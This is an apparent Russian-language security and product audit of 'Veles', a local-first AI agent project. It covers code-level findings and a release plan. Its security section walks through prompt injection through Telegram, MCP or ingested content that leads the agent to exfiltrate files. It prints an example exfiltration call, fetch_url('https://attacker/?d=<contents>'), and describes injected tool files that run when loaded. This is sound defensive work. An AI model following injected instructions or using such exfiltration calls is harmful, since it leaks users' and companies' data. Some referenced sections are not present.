# Veles — продуктовый, архитектурный и security-аудит

**Дата:** 2026-07-05 · **Ветка:** feat/wiki-migration-engine · **Версия:** veles-ai 0.8.3 · git HEAD ≈ M190
**Метод:** 4 параллельных скептических аудита (архитектурный дрейф, безопасность, продуктовое соответствие, гниль кода) со сверкой по `VISION.md`. Все находки — с `file:line`. Четыре несущих находки, на которых держится план (P1, C1, H2, мёртвый `FailoverProvider`), проверены прямым чтением кода вручную, а не только со слов субагентов.

## 0. Резюме на одну страницу

**Что есть на самом деле:** Veles — это очень хороший **одно-операторный, одно-машинный персональный агент** с сильной локально-первой памятью и аккуратным ядром. Он **маркетингуется** (в новой продуктовой цели) как **автономный многопользовательский корпоративный сотрудник**. Разрыв между этими двумя вещами — не полировка, а **три архитектурно отсутствующих подсистемы** + деплой/наблюдаемость + два класса security-дыр, критичных именно для второго сценария.

**Вердикт по двум целям:**
- **Цель A — личный ассистент:** в основном реализована. Остаточные проблемы — это надёжность памяти на горизонте месяцев, а не отсутствующие столпы. **1–2 спринта до рыночной готовности.**
- **Цель B — виртуальные сотрудники 24/7 для компаний на локальной LLM:** ~30% автономии, ~90% локальности, 0% мультипользовательности. Три несущих столпа (self-driving loop, устойчивость к падениям/ретраи, идентичность+права+аудит на человека) **отсутствуют архитектурно, а не недошлифованы.** **Многоквартальная работа.**

**Самое опасное для монетизации:** УТП «минимальная утечка информации» подорвано в *продаваемой* конфигурации (24/7, каналы): Telegram-гейт fail-open по умолчанию + trust-ladder глушится autopilot'ом + prompt-injection → эксфильтрация ничем механически не блокируется + самописные tools исполняют произвольный код при загрузке.

**Центральное противоречие (см. §1):** сам `VISION.md` целится в «одного человека или маленькую группу» и прямо декларирует *не-цели* — «не строит cloud-инфраструктуру», «нет аккаунтов», «команды — позже». Цель B требует ровно того, что VISION вынес в не-цели. **До написания кода нужно решить: специализируемся на A или разворачиваем VISION в сторону B.**

## 1. Системное противоречие №1 — в проекте живут два разных продукта

`VISION.md` — это спека **персонального инструмента для power-user'а терминала**:

- §1: «ориентирован на knowledge workers… опытные пользователи терминала… **Команды — позже**, как естественное расширение через shared exports.»
- §10 (Не-цели): «**не строит cloud-инфраструктуру** для пользователя (нет SaaS, нет shared backend, **нет аккаунтов**)».
- §8: trust ladder — «per-операция», привязан к OS-аккаунту, не к человеку.

Продуктовая цель B (виртуальные сотрудники для больших компаний, мультипользовательские, разворачиваемые как инфраструктура) — это **другой продукт**, который противоречит текущей продуктовой ДНК. Это не «доделать фичи», это смена класса системы: single-tenant CLI → multi-tenant сервис.

**Почему это корень остальных находок:** весь код честно построен под VISION (single-tenant, ContextVar «активный проект», bearer-token без принципала, сессии без user_id). Security- и product-разрывы ниже — не баги, а **следствие того, что систему для A применяют к B**.

**Развилка, которую должен решить владелец (см. §6):**
- **Путь 1 — «Специализация на A»:** выпустить как лучший локально-первый персональный агент; B — отдельный roadmap v2 поверх стабильного A.
- **Путь 2 — «Разворот к B»:** переписать VISION §8/§10, заложить multi-tenant/identity/deploy как first-class. Дороже на порядок.

Рекомендация — **Путь 1 с явным заделом под B** (обоснование в §6).

## 2. Системные архитектурные проблемы

### 2.1 Ядро протекает в граф зависимостей (нарушение опоры №1 «минимальное модульное ядро»)

Конституция (CLAUDE.md §1, VISION §4): *core = память + learning loop + оркестратор + провайдер-протокол + минимум tools; всё остальное — модуль*. В коде граф зависимостей это нарушает:

- **C1 — `core → cli` (top-level, безусловный):** `core/model_resolver.py:6` импортирует `DEFAULT_MODEL, DEFAULT_PROVIDER` из `cli/_parsers/_common.py:17`. Ядро не запускается без CLI-слоя. Самое чистое противоречие.
- **C2 — `core → daemon` (lazy, но реальный):** `core/tool_dispatch.py:235,354` тянут `from veles.daemon.logging import truncate_for_log`. Утилита логирования из «опционального модуля» нужна на пути диспатча тула.
- **C4 — ядро жёстко именует конкретный класс `Wiki`** в ~8 местах (`core/self_doc.py`, `core/dreaming.py`, `core/memory/router.py`, `core/subproject_proposer.py`, `core/layout/scaffold.py`). *Поведение* гейтится `wiki_enabled()` корректно; *связность* — нет. «Всё остальное — плагин» верно для исполнения, ложно для графа зависимостей.

### 2.2 God-files (нарушение опоры №1 «clean, decomposed, no god-files»)

- `cli/commands/repl.py` — **2548 строк**, класс `_ReplApp` на **~1419 строк** в одном классе (`_make_keys` ~246, `__init__` ~206).
- `daemon/server.py` — **897 строк**.
- Оба выше порога 800 LOC, который сам проект считает «god-file».

### 2.3 Две несовместимые философии плагинов под одним `modules/`

- **Hook-модули** (`embedding.py`, `vision.py`, `stt.py`) — регистрируются через `register(api)` и `ModuleRegistry`/`fire_hook`.
- **Engine-модули** (`wiki/`, `organize/`) — жёстко импортируются ядром, активируются отдельным механизмом `wiki_enabled`/`engine_enabled`.

Два философски разных контракта плагина сосуществуют без общего интерфейса — при том что «модульность» заявлена пятой опорой VISION. Для продукта, который обещает экосистему модулей (VISION §6), это фундаментальная неопределённость: сторонний автор модуля не знает, какой из двух контрактов реализовать.

### 2.4 Незавершённые миграции как постоянное состояние

- **REPL наполовину вынесен:** god-file `cli/commands/repl.py` (2548) + частично извлечённый пакет `cli/repl/` (1511 LOC). `cli/repl/__init__.py` документирует «M187 transition» как текущее состояние.
- **Textual «выпилен» в M187, но жив:** 22 файла, 12 `import textual`, **3 501 LOC** ради ровно 3 точек входа (два wizard'а + daemon-picker). Тяжёлая UI-зависимость обслуживает узкую опциональную поверхность (детали — §5.5).
- **185 маркеров legacy/deprecated** при декларированной политике «back-compat не нужен, удалять сразу» — 7 из них живые back-compat-шимы (парсер-алиас, re-export'ы под тесты, legacy-ключи daemon/channels, cron back-compat).

### 2.5 Здоровье тестов — количество есть, изоляция под вопросом

3 107 тест-функций на 56k LOC — солидно. Но **1 729 mock/patch/monkeypatch (~0.56 на тест)** — тесты сильно лезут во внутренности, а не гоняют публичные API. Плюс конфиг **бессхемный** (`get_section()` free-form TOML): опечатка ключа падает молча (см. security M-config ниже — это же и дыра).

## 3. Безопасность (калибровано под «AI-сотрудник 24/7 для компаний»)

> Файловая песочница и таксономия прав сделаны хорошо **для attended CLI**. Коммерческий риск концентрируется в *unattended, канальном* режиме — том самом, что продаётся.

### CRITICAL
- **C1 — Telegram-гейт fail-open по умолчанию.** `_is_allowed` возвращает `True` при пустом whitelist (`channels/telegram/_gateway.py:687`); мастер настройки прямо предлагает «blank = allow all» (`channels/telegram/__init__.py:98-102`); `veles channel run` вообще не передаёт whitelist (`cli/commands/channel.py:155-161`). Любой в Telegram → turn агента с shell+запись+web, **минуя bearer-token daemon** (in-process backend). Между незнакомцем из интернета и исполнением кода на хосте компании — опциональное поле, которое визард советует оставить пустым.

### HIGH
- **H1 — в проданной конфигурации shell фактически без гейта.** Autopilot авто-разрешает все sensitive-tools (`core/trust.py:117-122`); standing-grants «always» диспатчатся молча навсегда (`:103-111`). `run_shell` — `bash -c` с полными правами, явно **не** в песочнице (`core/tools/builtin/run_shell.py:16-23`; `sandbox_cwd()` пинит только cwd). Non-TTY отказ ladder'а не спасает — daemon/каналы ставят свои промптеры.
- **H2 — prompt-injection → эксфильтрация ничем не блокируется (прямой удар по УТП «минимальная утечка»).** Правило `_untrusted_args_rule` — документированный no-op (`core/permission/engine.py:141-151`: «Today: no-op»). Контент *помечается* untrusted (`core/untrusted.py`), но механически ничто не мешает на нём действовать. `fetch_url`/`web_search` форсированы в `allow` (`core/permission/policy.py:52-53`). Путь без гейтов: инъекция через `veles add`/Telegram/MCP → чтение файла → `fetch_url("https://attacker/?d=<contents>")`.
- **H3 — самописные tools исполняют произвольный код при загрузке, до любого гейта.** `.veles/tools/*.py` импортируются через `importlib.exec_module` (`core/tools/loader.py:196-197`) — код верхнего уровня выполняется на старте агента, раньше permission-engine/trust. Ревью-гейта нет. LLM (управляемый инъекцией по H2) пишет `.py` в `.veles/tools/` → его top-level statements исполняются при следующей загрузке. Плюс tool без `risk_class` → `effective_policy` = `allow` (`core/permission/policy.py:135-137`).

### MEDIUM
- **M1 — результаты MCP-серверов и текст Telegram вклеиваются в промпт без `wrap_untrusted`** (`mcp/registry_adapter.py:56-86`; `wrap_untrusted` отсутствует в `mcp/` и `channels/`). Вторая поверхность инъекции, питающая H2. (Каталог MCP-тулов при этом санитизируется хорошо — `mcp/sanitize.py`.)
- **M2 — daemon без TLS; bearer-token печатается в stderr → на диск.** `web.run_app` — plain HTTP; при `host=0.0.0.0` (каскад это поддерживает) токен уходит в открытом виде. Токен также печатается в stderr (`cli/commands/daemon_tokens.py:26-32`) → для detached daemon перенаправляется в `~/.veles/logs/`.
- **M3 — `veles export full` архивирует секреты verbatim.** Санитизация только в `template`-режиме (`core/export.py:184-196`); `full` тарит `.veles/` как есть — включая `config.toml` с Telegram `bot_token` в открытую и `trust.json`.

### Сделано хорошо (честная калибровка)
Токены daemon (128-бит `secrets.token_hex`, `compare_digest`, mode `0600`) · bind по умолчанию `127.0.0.1` · реальный `path_guard` (отвергает `..`, резолвит симлинки, узкий whitelist `~/.veles/`) · SSRF deny-list с метадата-IP · `always_confirm` без env-байпаса · локальные эмбеддинги 3-tier без сети · секреты в OS-keychain · import-tarball с `filter="data"`.

## 4. Продуктовые разрывы по двум целям

### Цель A — личный ассистент (в основном реализована)

**Blocker:**
- **Флагманский REPL (`veles` без аргументов) впрыскивает ноль recall и не запускает авто-curation.** `cli/commands/repl.py:357-393` строит промпт через `_build_run_system_prompt`, который читает `getattr(args, "prompt", "")` (`cli/_runtime.py:236`) — но REPL-парсер не определяет `prompt`, поэтому `_recall_block(project, "")` → `None` каждый turn. Ни `<memory-context>`, ни `<relevant-files>`. Post-turn curator/insight/dream в REPL не вызываются (0 совпадений по `post_turn|dream|insight` в `repl.py`). **Пользователь дефолтного интерфейса получает почти инертную память** — turn'ы пишутся, но выпадают из recall на 30-й день, и ничего не дистиллируется, пока он отдельно не запустит `veles run`/`veles curate`. Прямой удар по «никогда не забывает» в главном UX. **Самый ценный фикс во всём отчёте.**

**Major:**
- Recall — keyword-FTS top-5, **без эмбеддингов на пути recall** (`core/memory/router.py:73-100`, `_RECALL_LIMIT=5`). `vector.py` есть, но `MemoryRouter` его не зовёт. Перефразированный запрос без общих токенов промахивается навсегда.
- Сырые turn'ы выпадают из recall жёстко на 30 дней (`router.py:43,175-176`) в *предположении*, что curator их дистиллировал — но если curation не запускался (REPL-blocker; или пользователи claude-cli/gemini-cli, которым авто-curation вообще недоступна), память тихо становится неотзываемой.
- Тихая деградация повсеместно: `search_turns`/`search_insights` возвращают `[]` на любой `sqlite3.OperationalError` (`memory/__init__.py:539-565`) — битый FTS = тихая амнезия без сигнала.

**Minor:** `rules.decay_score`/`last_applied_at` без писателей (всегда 1.0); нет eviction/prune/VACUUM; dedup смотрит только 200 свежих инсайтов (`dreaming.py:72`) — старая дублирующая масса не пересматривается; нет разрешения противоречий между правилами. `modules/embedding_autodetect.py:38-79` может тихо уехать в облако если Ollama на секунду недоступен, а ключ экспортирован (fallback по наличию `OPENROUTER_API_KEY`, не по `--provider`).

### Цель B — виртуальные сотрудники 24/7 (аспирационна)

**Blockers (архитектурно отсутствуют):**
- **Нет self-driving loop — «работает до результата» не существует.** GoalMode FSM (`core/modes/goal.py`) turn-gated by design: «один prompt = один переход фазы» (:12); после каждого EXECUTE ждёт, пока человек напечатает `continue` (:32-35, :599). Цикла EXECUTE→CHECK→EXECUTE без человека нет. Scheduled job = один `agent.run()` с потолком 30 итераций (`core/agent.py:145`), без моста job→goal.
- **Нет устойчивости к падениям.** `DaemonState.runs` — in-memory dict (`daemon/state.py:61`), при смерти daemon run исчезает; rehydrate на старте отсутствует. Упавший job оставляет `status='running'` навсегда (`jobs_store.py:267-274`) и перезапускается (случайный at-least-once). Watchdog нет — код сам советует `systemd`/`tmux` (`cli/commands/channel.py:13`).
- **Ретраи провайдера практически отсутствуют.** 0 `retry|backoff` в `adapters/*`; локальные адаптеры явно `max_retries=0` (`adapters/local/_base.py:93-96`). `FailoverProvider` есть — но **мёртвый код, никто не импортирует** (`core/provider_pool.py`). Транзиентный 503 в середине часового run'а — фатален.
- **Мультипользовательность архитектурно отсутствует.** Auth — общие bearer-токены, чья идентичность *выбрасывается* middleware (`daemon/auth.py:129-149` — проверяет и отбрасывает, принципал не крепится к run/log). Run API без actor-поля. Telegram — бинарный whitelist (пусто=всем), `user_id` намеренно исключён из session-key (`channels/session_map.py:56-59`) → пользователи группового чата делят одну сессию и одну память. Trust — per-tool/per-OS-аккаунт, не per-человек. Ролей/прав на пользователя нет.
- **Аудит пишет ЧТО, но никогда КТО.** `events.jsonl` логирует каждый ToolCall с аргументами (`core/events.py:66-84`), но идентичность — только `session_id`; `ApprovalRecord.approver` всегда `"user"`/`"autopilot"`. Для компании, чей агент гоняет shell, «какой человек вызвал этот `rm`?» — без ответа. Оба стока best-effort/exception-swallowed — не tamper-evident.
- **Shell-tool не в песочнице** (дубль H1) — `rm -rf ~` вне проекта возможен, как только run_shell доверен, а любой daemon/Telegram-деплой этого требует.

**Major:** нет packaging для деплоя (0 `Dockerfile`/`*.service`/Helm) · нет метрик/observability (0 `prometheus|otel|sentry`) · нет TLS · config-парсинг молча-permissive (опечатка `whitlist=` → канал открыт всем) · бюджеты не работают (`add_cost` не кормится реальной ценой — $5-бюджет не срабатывает никогда, `modes/goal.py:529-535`).

**Сильная сторона B:** локально-первый роутинг реален и намеренен (M165c убрал хардкод cloud-fallback'ов — «never silently cloud», `core/routing/ensemble.py:46`); Ollama tool-capability autodetect; fenced-tools для non-tool моделей; recall на FTS5 без облачных эмбеддингов; ноль телеметрии. **Локальность ~90% реальна — самая защищаемая часть питча.**

## 6. Рекомендация по специализации

**Специализироваться на Пути 1 («лучший локально-первый персональный агент») с явным, но отложенным заделом под B.**

Обоснование:
1. **A почти готов (1–2 спринта), B — многоквартальный.** Выпуск A даёт рынок, пользователей и метрику (VISION North Star = активные юзеры) уже сейчас; B без A — это стройка без фундамента.
2. **Локальность — самое защищаемое УТП, и она уже реальна (~90%).** «Приватный агент, который никогда не забывает и не звонит домой» — честное позиционирование A *сегодня*. «Не утекает» для B *ложно сегодня* (§3 H2/H3) — продавать это компаниям пока опасно юридически и репутационно.
3. **B требует смены класса системы** (multi-tenant, identity, deploy, аудит-на-человека, автономный loop). Это не спринт — это v2. Но многие кирпичи (self-driving loop, retry-resilience, per-user identity) — законные улучшения и для надёжности A, поэтому задел не пропадает.

**Практически это значит:** сначала закрыть блокеры A + *локальный* security-минимум, довести до 1.0; параллельно вести отдельный B-трек как исследовательский, не блокирующий релиз A.

**Важно для scope 1.0 (иначе §7 читается противоречиво):** для персонального локального 1.0 **каналы (Telegram) и сетевой daemon — это НЕ фичи 1.0**, а вход в B-трек. Поэтому security делится по защищаемой поверхности:
- **Локальный security бьёт даже одного пользователя и блокирует 1.0:** prompt-injection → эксфильтрация (H2) и самописные tools (H3) срабатывают у соло-пользователя, потому что `veles add`/`fetch_url`/`web_search` работают с внешним контентом на одной машине. Это волна S-local.
- **Сетевой security (Telegram fail-closed, TLS, wrap MCP) — гейт «перед включением каналов/daemon»**, то есть блокер B-трека, а не персонального 1.0.

**Монетизация и лицензия (владелец сам поднял тему).** Apache-2.0 + «монетизация через платную enterprise-интеграцию и поддержку» — классическая open-core экспозиция: ничто не мешает третьей стороне перепродавать ту же интеграцию. Для B-трека стоит заранее решить модель (open-core с проприетарным enterprise-слоем под отдельной лицензией / dual-license / BSL на enterprise-компоненты), иначе главный канал выручки юридически не защищён.

- **S1 — Telegram fail-CLOSED.** Пустой whitelist = никого; `required=True` на whitelist в визарде и `veles channel run`. Закрывает CRITICAL C1. *Файлы:* `channels/telegram/_gateway.py:687`, `channels/telegram/__init__.py:98`, `cli/commands/channel.py:155`.

- **S6 — Гигиена секретов + TLS.** `export full` санитизирует/шифрует секреты (или явный `--include-secrets` с warning); токен daemon не печатать в лог-файл; при non-loopback bind требовать TLS или отказывать.

### Волна B — задел под enterprise (post-1.0 roadmap, не блокирует релиз A)

- **B1 — Self-driving execution loop.** Мост job→goal; автономный EXECUTE→CHECK→EXECUTE до результата/бюджета без человека; рабочие бюджеты (реальный `add_cost`), stall-guard, потолок итераций с re-queue.
- **B2 — Crash/retry resilience.** Rehydrate `DaemonState.runs` на старте; очистка orphan `status='running'`; оживить `FailoverProvider` + backoff в адаптерах; watchdog/health-supervision.
- **B3 — Идентичность на человека.** Принципал из bearer-токена крепится к run/log; `user_id` в session-key; actor-поле в run API; trust и аудит per-человек; `ApprovalRecord.approver` = реальный субъект. Tamper-evident аудит.
- **B4 — Data-lifecycle / compliance.** Право на удаление и retention-политика памяти: eviction/prune/VACUUM (сейчас отсутствуют полностью), команда стирания по субъекту/проекту, TTL. Для enterprise это **compliance-блокер** (GDPR right-to-erasure), а не «гниль»: «никогда не забывает» + отсутствие пути удаления = невозможность выполнить требование об удалении данных.
- **B5 — Deploy story.** Dockerfile + compose + systemd unit; headless-first-run без TTY-ловушки; migration-path для memory.db.
- **B6 — Observability.** Метрики (Prometheus/OTel), structured logs, алертинг, TLS as default для не-loopback.
- **B7 — Реальный sandbox для shell** (seccomp/container/denylist) — обязателен, если агент смотрит наружу на недоверенных пользователей.
